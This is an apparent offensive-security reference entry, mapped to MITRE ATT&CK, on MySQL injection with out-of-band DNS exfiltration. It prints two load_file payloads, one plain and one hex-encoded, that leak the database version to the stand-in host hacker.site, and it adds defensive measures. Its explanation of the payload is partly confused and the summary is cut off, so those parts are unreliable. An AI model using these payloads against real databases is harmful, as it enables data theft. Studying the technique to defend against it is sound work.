---
id: 791496ff-5c08-477b-b056-1ad1739337f6
name: MYSQL Injection with Out of Band DNS Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:35.038779+00:00'
updated_at: '2023-04-10T20:22:53.460769+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Data Transfer Size Limits|T1030 - Data Transfer Size Limits]]'
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Exfiltration Over Command and Control Channel|T1041 - Exfiltration Over Command
  and Control Channel]]'
- '[[Standard Cryptographic Protocol|T1032 - Standard Cryptographic Protocol]]'
tags:
- '[[DNS exfiltration]]'
- '[[MYSQL Injection]]'
- '[[MYSQL Out of band]]'
commands:
- '[[Load file from remote server]]'
- '[[Load file with hexadecimal values]]'
---

# MYSQL Injection with Out of Band DNS Exfiltration

## Summary

This procedure involves exploiting a vulnerability in MYSQL to inject malicious SQL code that allows an attacker to retrieve data from a file. The attacker can then use the MYSQL Out of Band technique to exfiltrate the data through DNS requests. This technique allows the attacker to bypass network 

## Description

# Description

This procedure involves exploiting a vulnerability in MYSQL to inject malicious SQL code that allows an attacker to retrieve data from a file. The attacker can then use the MYSQL Out of Band technique to exfiltrate the data through DNS requests. This technique allows the attacker to bypass network security measures and avoid detection. The attacker can use this procedure to steal sensitive data, such as login credentials, credit card information, or intellectual property.

Technical Explanation: MYSQL Injection is a technique used to exploit a vulnerability in a MYSQL database by injecting malicious SQL code. MYSQL Out of Band is a technique used to exfiltrate data through a secondary channel, such as DNS requests. DNS Exfiltration is a technique used to exfiltrate data by encoding it in DNS queries and responses. This allows the attacker to bypass network security measures and avoid detection. The attacker can use this technique to steal sensitive data, such as login credentials, credit card information, or intellectual property.

Business Value: This procedure can be used by attackers to steal sensitive data from a MYSQL database. This can result in financial losses, reputational damage, and legal liabilities for the victim organization.

 

## Requirements

1. Access to a MYSQL database

1. Knowledge of SQL Injection techniques

1. Ability to send DNS requests

 

## Defense

1. Implement input validation and parameterized queries to prevent SQL Injection attacks

1. Monitor DNS traffic for suspicious activity

1. Implement DNS security measures, such as DNSSEC and DNS filtering, to prevent DNS Exfiltration

 

## Objectives

1. Retrieve sensitive data from a MYSQL database

1. Exfiltrate the data through DNS requests

 

# Instructions

1. Use SQL Injection to retrieve data from a file.

 



**Code**: [[select load_file(concat('\\\\',version(),'.hacker.]]



> This command allows an attacker to retrieve data from a file using SQL injection. The 'load_file' function is used to read the contents of a file and return it as a string. The 'concat' function is used to construct the file path and name. The first 'concat' function constructs the file path using the 'version()' function to retrieve the MySQL version number and the '.hacker.site' domain name. The second 'concat' function constructs the file path using the hexadecimal values of the backslash, the 'version()' function, the '.hacker.site' domain name, and the file name 'a.txt'. This command can be used to retrieve sensitive information such as passwords, configuration files, and other sensitive data stored in files.



**Command** ([[Load file from remote server]]):

```bash
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```





**Command** ([[Load file with hexadecimal values]]):

```bash
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Data Transfer Size Limits|T1030 - Data Transfer Size Limits]]
- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Exfiltration Over Command and Control Channel|T1041 - Exfiltration Over Command and Control Channel]]
- [[Standard Cryptographic Protocol|T1032 - Standard Cryptographic Protocol]]

## Commands Used

- [[Load file from remote server]]
- [[Load file with hexadecimal values]]

## Tags

- [[DNS exfiltration]]
- [[MYSQL Injection]]
- [[MYSQL Out of band]]


